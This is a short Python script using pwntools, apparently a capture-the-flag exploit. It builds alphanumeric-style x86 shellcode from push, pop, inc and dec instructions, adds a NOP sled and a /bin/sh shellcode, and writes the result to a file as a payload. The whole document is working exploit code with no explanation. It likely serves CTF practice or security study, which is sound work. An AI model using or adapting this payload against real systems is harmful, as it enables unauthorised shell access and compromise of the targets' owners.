from pwn import *

open('/=/Downloads2/a', 'wb').write(asm('''
push esp
inc esp
pop eax
dec eax
dec eax
dec eax
dec eax
dec eax
push eax
dec esp
pop esp
push edx
inc esp
inc esp
pop edx
inc esp
pop eax
pop ebx

inc esp

; esp = ...cd
%s
inc esp
push esp
pop edi
; esp = ...80
%s
dec esp
push esp
pop ebp

; ecx = buf
push esp
inc esp
push eax
pop eax
dec esp
pop ecx

%s

inc eax
inc eax
inc eax

push edi
pop edi
inc esp
push ebp
dec esp
pop esi

inc esp
inc esp
push ebx
push ebx
push esi
push ebx

''' % ('pop esi\n' * 0x1c, 'push esi\n' * 0x13, 'push eax\n' * 22)
) + '\n' + '\x90' * 0x20 + asm(shellcraft.i386.sh()))
